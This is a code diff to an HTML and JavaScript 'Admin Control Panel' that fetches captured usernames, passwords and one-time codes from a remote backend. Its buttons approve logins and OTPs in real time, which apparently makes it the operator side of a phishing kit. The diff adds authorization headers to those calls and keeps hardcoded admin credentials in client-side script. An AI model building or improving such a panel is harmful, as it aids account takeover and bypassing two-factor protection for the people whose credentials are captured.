@@ -7,13 +7,14 @@
   <style>
     body {
       font-family: Arial, sans-serif;
+      margin: 0;
+      background-color: #fff;
       max-width: 500px;
-      margin: 30px auto;
       padding: 20px;
+      margin: 30px auto;
       background: #f7f9fc;
     }
     h1 { text-align: center; color: #0070c9; }
-
     .info, .login {
       background: white;
       padding: 15px;
@@ -21,7 +22,6 @@
       box-shadow: 0 0 10px #ddd;
       margin-bottom: 20px;
     }
-
     input {
       display: block;
       width: 100%;
@@ -30,7 +30,6 @@
       border-radius: 4px;
       border: 1px solid #ccc;
     }
-
     button {
       background: #0070c9;
       color: white;
@@ -42,12 +41,10 @@
       margin-right: 10px;
       margin-bottom: 10px;
     }
-
     button:disabled {
       background: #aaa;
       cursor: not-allowed;
     }
-
     #status { font-weight: bold; margin-top: 10px; }
   </style>
 </head>
@@ -55,7 +52,6 @@
 
 <h1>Admin Control Panel</h1>
 
-<!-- 🔐 Login Form -->
 <div class="login" id="loginForm">
   <h2>Login</h2>
   <input type="text" id="adminUser" placeholder="Username" />
@@ -64,7 +60,6 @@
   <p id="loginStatus"></p>
 </div>
 
-<!-- 👮 Admin Content (Hidden by default) -->
 <div class="info" id="adminPanel" style="display:none;">
   <p><strong>Username:</strong> <span id="username">-</span></p>
   <p><strong>Password:</strong> <span id="password">-</span></p>
@@ -81,7 +76,8 @@
 <p id="status"></p>
 
 <script>
-  const API_BASE = 'https://my-node-backend-4nfy.onrender.com'; // ✅ Render backend
+  // ✅ Auto-detect backend for local vs live domains
+  const API_BASE = 'https://my-node-backend-4nfy.onrender.com';
 
   const usernameSpan = document.getElementById('username');
   const passwordSpan = document.getElementById('password');
@@ -97,13 +93,13 @@
   const adminPanel = document.getElementById('adminPanel');
   const adminButtons = document.getElementById('adminButtons');
 
+  // Default admin credentials (should match .env on backend)
   const AUTH_USERNAME = 'admin';
   const AUTH_PASSWORD = 'secure123';
 
   function handleLogin() {
     const user = document.getElementById('adminUser').value.trim().toLowerCase();
     const pass = document.getElementById('adminPass').value.trim();
-
     if (user === AUTH_USERNAME && pass === AUTH_PASSWORD) {
       loginForm.style.display = 'none';
       adminPanel.style.display = 'block';
@@ -118,24 +114,20 @@
 
   async function fetchLoginData() {
     try {
-      const res = await fetch(`${API_BASE}/get-login-data`);
+      const res = await fetch(`${API_BASE}/get-login-data`, {
+        headers: { 'Authorization': 'Basic ' + btoa(`${AUTH_USERNAME}:${AUTH_PASSWORD}`) }
+      });
       const data = await res.json();
-
       if (data.loginData) {
         usernameSpan.textContent = data.loginData.username || '-';
         passwordSpan.textContent = data.loginData.password || '-';
         otpSpan.textContent = data.loginData.otp || '-';
 
         let status = '';
-        if (!data.loginData.username) {
-          status = 'Waiting for login';
-        } else if (!data.approved) {
-          status = 'Pending Login Approval';
-        } else if (data.loginData.otp && !data.otpApproved) {
-          status = 'OTP Pending Approval';
-        } else if (data.otpApproved) {
-          status = 'OTP Approved';
-        }
+        if (!data.loginData.username) status = 'Waiting for login';
+        else if (!data.approved) status = 'Pending Login Approval';
+        else if (data.loginData.otp && !data.otpApproved) status = 'OTP Pending Approval';
+        else if (data.otpApproved) status = 'OTP Approved';
 
         approvalStatusSpan.textContent = status;
 
@@ -153,7 +145,10 @@
     approveLoginBtn.disabled = true;
     statusMsg.textContent = 'Approving login...';
     try {
-      const res = await fetch(`${API_BASE}/approve-login`, { method: 'POST' });
+      const res = await fetch(`${API_BASE}/approve-login`, {
+        method: 'POST',
+        headers: { 'Authorization': 'Basic ' + btoa(`${AUTH_USERNAME}:${AUTH_PASSWORD}`) }
+      });
       const data = await res.json();
       statusMsg.textContent = data.message;
       fetchLoginData();
@@ -168,7 +163,10 @@
     approveOtpBtn.disabled = true;
     statusMsg.textContent = 'Approving OTP...';
     try {
-      const res = await fetch(`${API_BASE}/approve-otp`, { method: 'POST' });
+      const res = await fetch(`${API_BASE}/approve-otp`, {
+        method: 'POST',
+        headers: { 'Authorization': 'Basic ' + btoa(`${AUTH_USERNAME}:${AUTH_PASSWORD}`) }
+      });
       const data = await res.json();
       statusMsg.textContent = data.message;
       fetchLoginData();
@@ -185,7 +183,10 @@
     approveOtpBtn.disabled = true;
     statusMsg.textContent = 'Resetting login data...';
     try {
-      const res = await fetch(`${API_BASE}/reset-login`, { method: 'POST' });
+      const res = await fetch(`${API_BASE}/reset-login`, {
+        method: 'POST',
+        headers: { 'Authorization': 'Basic ' + btoa(`${AUTH_USERNAME}:${AUTH_PASSWORD}`) }
+      });
       const data = await res.json();
       statusMsg.textContent = data.message;
       fetchLoginData();
